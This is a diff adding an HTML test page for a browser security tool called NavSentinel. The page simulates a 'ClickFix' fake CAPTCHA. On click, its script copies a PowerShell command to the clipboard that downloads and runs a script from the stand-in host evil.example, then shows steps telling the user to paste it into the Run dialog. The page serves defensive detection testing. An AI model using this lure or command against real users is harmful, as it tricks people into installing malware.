@@ -1,0 +1,159 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>ClickFix 01 - Basic Fake CAPTCHA</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      padding: 24px;
+      background: #f5f5f5;
+    }
+    h1 { margin-top: 0; }
+    .description {
+      background: #fff3cd;
+      border: 1px solid #ffc107;
+      padding: 12px;
+      border-radius: 4px;
+      margin-bottom: 20px;
+    }
+
+    /* Fake CAPTCHA overlay */
+    #fake-captcha-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      z-index: 10000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    #fake-captcha-box {
+      background: #fff;
+      border-radius: 8px;
+      padding: 32px;
+      width: 380px;
+      text-align: center;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.3);
+    }
+    #fake-captcha-box h2 {
+      margin-top: 0;
+      color: #333;
+    }
+    #fake-captcha-box .checkbox-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin: 20px 0;
+      padding: 12px;
+      border: 2px solid #ddd;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    #fake-captcha-box .checkbox-row:hover {
+      border-color: #4285f4;
+    }
+    #fake-captcha-box .fake-checkbox {
+      width: 20px;
+      height: 20px;
+      border: 2px solid #999;
+      border-radius: 3px;
+    }
+    #fake-captcha-box .steps {
+      text-align: left;
+      margin-top: 16px;
+      padding: 12px;
+      background: #f9f9f9;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+    #fake-captcha-box .steps li {
+      margin: 6px 0;
+    }
+
+    #status {
+      margin-top: 16px;
+      padding: 8px 12px;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+    .status-pending { background: #fff3cd; }
+    .status-triggered { background: #d4edda; color: #155724; }
+  </style>
+</head>
+<body>
+  <h1>ClickFix 01 - Basic Fake CAPTCHA</h1>
+  <div class="description">
+    <strong>Attack scenario:</strong> A fake CAPTCHA overlay silently writes a malicious
+    command to the clipboard, then instructs the user to paste it into a Run dialog.
+    <br><br>
+    <strong>Expected:</strong> NavSentinel detects the combination of clipboard write +
+    overlay + instruction text and shows a warning.
+    <br><br>
+    <strong>Note:</strong> This gym fixture simulates the clipboard write via a button click.
+    In a real attack, the write happens automatically when clicking the "verify" checkbox.
+  </div>
+
+  <div id="fake-captcha-overlay">
+    <div id="fake-captcha-box">
+      <h2>Verify you are human</h2>
+      <p style="color: #666; font-size: 14px;">Security verification required to continue</p>
+
+      <div class="checkbox-row" id="verify-btn">
+        <div class="fake-checkbox" id="checkbox-icon"></div>
+        <span>I am not a robot</span>
+      </div>
+
+      <div class="steps" id="steps-section" style="display: none;">
+        <strong>Verification Steps:</strong>
+        <ol>
+          <li>Press <kbd>Win+R</kbd> to open the Run dialog</li>
+          <li>Press <kbd>Ctrl+V</kbd> to paste the verification code</li>
+          <li>Press <kbd>Enter</kbd> to verify</li>
+        </ol>
+      </div>
+    </div>
+  </div>
+
+  <div id="status" class="status-pending">
+    Status: Waiting for user to click the fake verify button...
+  </div>
+
+  <script>
+    // This simulates a ClickFix attack.
+    // In a real attack, clipboard.writeText() is called silently on click.
+    // Here we use a button to trigger it so the gym fixture is safe to interact with.
+    const verifyBtn = document.getElementById("verify-btn");
+    const checkboxIcon = document.getElementById("checkbox-icon");
+    const stepsSection = document.getElementById("steps-section");
+    const statusEl = document.getElementById("status");
+
+    verifyBtn.addEventListener("click", function() {
+      // Simulate the malicious clipboard write
+      // In a real attack this would be: powershell -e <base64_payload>
+      const fakeCommand = "powershell -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('https://evil.example/payload.ps1')\"";
+
+      navigator.clipboard.writeText(fakeCommand).then(function() {
+        // Show the "verification steps" (paste instructions)
+        checkboxIcon.style.background = "#4285f4";
+        checkboxIcon.innerHTML = "&#10003;";
+        checkboxIcon.style.color = "#fff";
+        checkboxIcon.style.textAlign = "center";
+        checkboxIcon.style.lineHeight = "20px";
+        checkboxIcon.style.fontSize = "14px";
+        stepsSection.style.display = "block";
+
+        statusEl.textContent = "Status: Clipboard write triggered + instructions shown. NavSentinel should alert.";
+        statusEl.className = "status-triggered";
+      }).catch(function(err) {
+        statusEl.textContent = "Status: Clipboard write failed (expected in some contexts): " + err.message;
+      });
+    });
+  </script>
+</body>
+</html>
